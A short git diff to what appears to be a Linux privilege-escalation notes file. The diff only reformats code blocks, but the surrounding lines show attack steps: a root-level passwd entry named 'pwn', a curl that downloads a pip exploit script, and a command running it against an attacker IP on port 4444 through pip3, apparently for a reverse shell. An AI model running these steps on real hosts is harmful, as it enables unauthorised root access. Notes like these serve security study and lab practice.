@@ -76,7 +76,8 @@ root) NOPASSWD: /usr/bin/curl
   pwn:$1$pwn$AxNbnbaujRUXRur/DewJ8/:0:0:/root/root:/bin/bash
   ```
   - start http server using python and note the IP
-  ```python -m SimpleHTTPServer 8080
+  ```
+  python -m SimpleHTTPServer 8080
   ```
   
   
@@ -110,6 +111,7 @@ root) NOPASSWD: /usr/bin/curl
  curl https://raw.githubusercontent.com/theamanrawat/privilege-escalation/master/Linux/pip_exp.py?token=AISTJLQB7CDRPQS3OWODDE27E23S2 -o exploit.py
  ```
  - run this exploit(replace <IP> with attacker's IP) and wait few seconds
- ```python3 exploit.py <IP> 4444 /usr/bin/pip3
+ ```
+ python3 exploit.py <IP> 4444 /usr/bin/pip3
  ```
   
